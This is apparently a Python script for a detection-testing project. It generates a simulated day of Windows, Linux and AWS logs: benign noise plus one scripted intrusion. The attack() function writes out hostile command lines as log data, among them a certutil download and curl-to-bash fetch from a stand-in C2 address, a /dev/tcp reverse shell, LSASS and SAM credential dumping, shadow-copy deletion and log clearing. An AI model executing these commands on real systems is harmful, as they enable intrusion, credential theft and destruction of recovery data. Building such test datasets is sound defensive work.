"""Generate a simulated attack day: samples/attack_simulation.jsonl.

The file mixes normal activity (noise) with one full intrusion:

    Windows workstation WIN-FIN-07 (phishing -> credential theft -> ransomware prep)
    AWS account 111122223333       (root login -> CloudTrail stopped)
    Linux web server web-01        (web exploit -> payload download -> reverse shell)

Each event carries a ``logsource`` tag, like the index/sourcetype a SIEM adds at
ingestion, and an ``@timestamp``. The output is deterministic (fixed seed), so the
integration test can check exactly which rules fire.

Usage:
    python -m scripts.generate_events
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent
OUTPUT = ROOT / "samples" / "attack_simulation.jsonl"

DAY_START = datetime(2026, 10, 14, 8, 0, 0, tzinfo=timezone.utc)
SEED = 42

WIN_PROC = {"product": "windows", "category": "process_creation"}
WIN_SEC = {"product": "windows", "service": "security"}
LNX_PROC = {"product": "linux", "category": "process_creation"}
AWS = {"product": "aws", "service": "cloudtrail"}

S32 = "C:\\Windows\\System32\\"
PS = S32 + "WindowsPowerShell\\v1.0\\powershell.exe"
WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
OUTLOOK = "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
EXPLORER = "C:\\Windows\\explorer.exe"
ACCOUNT = "111122223333"

HOSTS = ["WIN-FIN-07", "WIN-FIN-02", "WIN-HR-11", "WIN-IT-01"]
USERS = ["CORP\\m.tremblay", "CORP\\a.gagnon", "CORP\\l.roy", "CORP\\it.admin"]


# --------------------------------------------------------------------------- #
# Event builders
# --------------------------------------------------------------------------- #
def win_proc(time: datetime, host: str, user: str, image: str, cmd: str, parent: str = EXPLORER):
    return {
        "@timestamp": time,
        "logsource": WIN_PROC,
        "EventID": 1,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": host,
        "User": user,
        "Image": image,
        "CommandLine": cmd,
        "ParentImage": parent,
    }


def win_sec(time: datetime, host: str, event_id: int, provider: str, **fields: Any):
    return {
        "@timestamp": time,
        "logsource": WIN_SEC,
        "EventID": event_id,
        "Channel": "Security",
        "Provider_Name": provider,
        "Computer": host,
        **fields,
    }


def lnx_proc(time: datetime, cmd: str, image: str = "/usr/bin/bash", user: str = "www-data"):
    return {
        "@timestamp": time,
        "logsource": LNX_PROC,
        "EventID": 1,
        "Computer": "web-01",
        "User": user,
        "Image": image,
        "CommandLine": cmd,
    }


def aws(time: datetime, source: str, name: str, identity: dict, ip: str, **fields: Any):
    return {
        "@timestamp": time,
        "logsource": AWS,
        "eventVersion": "1.09",
        "eventTime": time,
        "eventSource": source,
        "eventName": name,
        "awsRegion": "ca-central-1",
        "sourceIPAddress": ip,
        "recipientAccountId": ACCOUNT,
        "userIdentity": identity,
        **fields,
    }


# --------------------------------------------------------------------------- #
# Normal activity (must not trigger any rule)
# --------------------------------------------------------------------------- #
WIN_NOISE = [
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer"),
    (OUTLOOK, '"OUTLOOK.EXE" /recycle'),
    (S32 + "svchost.exe", "svchost.exe -k netsvcs -p -s Schedule"),
    (S32 + "cmd.exe", "cmd.exe /c ipconfig /all"),
    (PS, "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\inventory.ps1"),
    (PS, "powershell.exe -NoProfile -Command Get-Service | Where Status -eq Running"),
    (S32 + "schtasks.exe", "schtasks.exe /query /fo LIST"),
    (S32 + "certutil.exe", "certutil -hashfile C:\\Downloads\\setup.exe SHA256"),
    (S32 + "vssadmin.exe", "vssadmin.exe list shadows"),
    (S32 + "net.exe", "net use Z: \\\\fileserver\\finance"),
    (S32 + "net.exe", "net localgroup administrators"),
    (S32 + "reg.exe", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip"),
    (S32 + "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
    (S32 + "msiexec.exe", "msiexec.exe /i C:\\IT\\7zip.msi /qn"),
    (S32 + "taskmgr.exe", "taskmgr.exe /7"),
]
LNX_NOISE = [
    ("/usr/sbin/nginx", "nginx: worker process", "www-data"),
    ("/usr/bin/apt-get", "apt-get update", "root"),
    ("/usr/sbin/cron", "/usr/sbin/CRON -f", "root"),
    ("/usr/bin/curl", "curl -o /tmp/health.json https://status.example.com/api", "deploy"),
    ("/usr/bin/bash", "bash -c 'curl -s https://api.example.com | jq .status'", "deploy"),
    ("/usr/bin/bash", "bash -c 'tar czf /backup/www.tgz /var/www > /dev/null 2>&1'", "root"),
    ("/usr/sbin/sshd", "sshd: deploy [priv]", "root"),
]
AWS_NOISE = [
    ("ec2.amazonaws.com", "DescribeInstances", {}),
    ("s3.amazonaws.com", "GetObject", {}),
    ("iam.amazonaws.com", "ListUsers", {}),
    ("cloudtrail.amazonaws.com", "DescribeTrails", {}),
    ("cloudtrail.amazonaws.com", "StopLogging", {"errorCode": "AccessDenied"}),
    ("signin.amazonaws.com", "ConsoleLogin", {"responseElements": {"ConsoleLogin": "Success"}}),
]
IAM_USER = {"type": "IAMUser", "userName": "devops", "arn": f"arn:aws:iam::{ACCOUNT}:user/devops"}


def noise(rng: random.Random, count: int = 320) -> list[dict]:
    events = []
    work_day = int(timedelta(hours=10).total_seconds())
    for _ in range(count):
        time = DAY_START + timedelta(seconds=rng.randrange(work_day))
        kind = rng.choices(["win", "sec", "lnx", "aws"], weights=[60, 10, 15, 15])[0]
        if kind == "win":
            image, cmd = rng.choice(WIN_NOISE)
            events.append(win_proc(time, rng.choice(HOSTS), rng.choice(USERS), image, cmd))
        elif kind == "sec":
            event_id = rng.choice([4624, 4634, 4672])
            events.append(win_sec(time, rng.choice(HOSTS), event_id, "Microsoft-Windows-Security-Auditing"))
        elif kind == "lnx":
            image, cmd, user = rng.choice(LNX_NOISE)
            events.append(lnx_proc(time, cmd, image=image, user=user))
        else:
            source, name, extra = rng.choice(AWS_NOISE)
            events.append(aws(time, source, name, IAM_USER, "198.51.100.10", **extra))
    return events


# --------------------------------------------------------------------------- #
# The intrusion
# --------------------------------------------------------------------------- #
def at(hour: int, minute: int, second: int = 0) -> datetime:
    return DAY_START.replace(hour=hour, minute=minute, second=second)


def attack() -> list[dict]:
    host, user = "WIN-FIN-07", "CORP\\m.tremblay"
    c2 = "198.51.100.23"
    payload = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    root = {"type": "Root", "arn": f"arn:aws:iam::{ACCOUNT}:root"}
    return [
        # 1. Phishing: the invoice macro starts an encoded PowerShell
        win_proc(at(9, 12, 3), host, user, PS, f"powershell.exe -nop -w hidden -enc {payload}", WORD),
        # 2. Tool download with a LOLBin
        win_proc(
            at(9, 12, 41),
            host,
            user,
            S32 + "certutil.exe",
            f"certutil.exe -urlcache -split -f http://{c2}/upd.exe C:\\Users\\Public\\upd.exe",
        ),
        # 3. Persistence
        win_proc(
            at(9, 13, 10),
            host,
            user,
            S32 + "schtasks.exe",
            'schtasks /create /sc onlogon /tn "EdgeUpdateCore" /tr "C:\\Users\\Public\\upd.exe"',
        ),
        # 4. Defense evasion
        win_proc(
            at(9, 24, 30), host, user, PS, "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
        ),
        # 5. Credential access
        win_proc(
            at(9, 26, 11),
            host,
            "NT AUTHORITY\\SYSTEM",
            S32 + "rundll32.exe",
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\d.bin full",
            "C:\\Users\\Public\\upd.exe",
        ),
        win_proc(
            at(9, 27, 45),
            host,
            "NT AUTHORITY\\SYSTEM",
            S32 + "reg.exe",
            "reg.exe save HKLM\\SAM C:\\Users\\Public\\s.hiv /y",
            "C:\\Users\\Public\\upd.exe",
        ),
        # 6. Backdoor account
        win_proc(
            at(9, 31, 2),
            host,
            "NT AUTHORITY\\SYSTEM",
            S32 + "net.exe",
            "net localgroup administrators svc_sqlbackup /add",
            S32 + "cmd.exe",
        ),
        # 7. Ransomware preparation
        win_proc(
            at(10, 41, 0),
            host,
            "NT AUTHORITY\\SYSTEM",
            S32 + "vssadmin.exe",
            "vssadmin.exe delete shadows /all /quiet",
            S32 + "cmd.exe",
        ),
        win_proc(
            at(10, 41, 20),
            host,
            "NT AUTHORITY\\SYSTEM",
            S32 + "wbem\\WMIC.exe",
            "wmic shadowcopy delete /nointeractive",
            S32 + "cmd.exe",
        ),
        # 8. Cover tracks: clear the Security log with wevtutil, then the 1102 audit event
        win_proc(
            at(10, 42, 0),
            host,
            user,
            S32 + "wevtutil.exe",
            "wevtutil.exe cl Security",
            S32 + "cmd.exe",
        ),
        win_sec(at(10, 42, 5), host, 1102, "Microsoft-Windows-Eventlog", SubjectUserName="m.tremblay"),
        # 9. Cloud: stolen root password, then CloudTrail is stopped
        aws(
            at(11, 5, 12),
            "signin.amazonaws.com",
            "ConsoleLogin",
            root,
            "203.0.113.77",
            responseElements={"ConsoleLogin": "Success"},
        ),
        aws(
            at(11, 7, 40),
            "cloudtrail.amazonaws.com",
            "StopLogging",
            root,
            "203.0.113.77",
            requestParameters={"name": "org-trail"},
        ),
        # 10. Linux web server: payload download and reverse shell
        lnx_proc(at(13, 30, 9), f"sh -c 'curl -fsSL http://{c2}/k.sh | bash'", image="/usr/bin/sh"),
        lnx_proc(at(13, 31, 0), f"bash -c 'bash -i >& /dev/tcp/{c2}/4444 0>&1'"),
    ]


def build_dataset(seed: int = SEED) -> list[dict]:
    rng = random.Random(seed)
    events = noise(rng) + attack()
    events.sort(key=lambda e: e["@timestamp"])
    for event in events:
        for key in ("@timestamp", "eventTime"):
            if isinstance(event.get(key), datetime):
                event[key] = event[key].strftime("%Y-%m-%dT%H:%M:%SZ")
    return events


def main() -> None:
    events = build_dataset()
    OUTPUT.parent.mkdir(exist_ok=True)
    with OUTPUT.open("w", encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event, ensure_ascii=False) + "\n")
    print(f"wrote {len(events)} events to {OUTPUT.relative_to(ROOT)}")


if __name__ == "__main__":
    main()
